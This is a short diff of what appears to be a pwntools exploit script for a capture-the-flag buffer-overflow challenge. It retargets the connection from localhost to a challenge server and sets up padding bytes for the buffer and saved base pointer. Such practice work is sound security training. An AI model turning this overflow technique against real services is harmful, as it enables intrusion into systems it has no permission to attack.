@@ -1,6 +1,7 @@
 from pwn import *
 
-io = remote("localhost", 9002)
+# io = process("./overflow")
+io = remote("uithack.td.org.uit.no", 9005)
 
 buffer = b"A" * 16
 bp = b"A" * 8
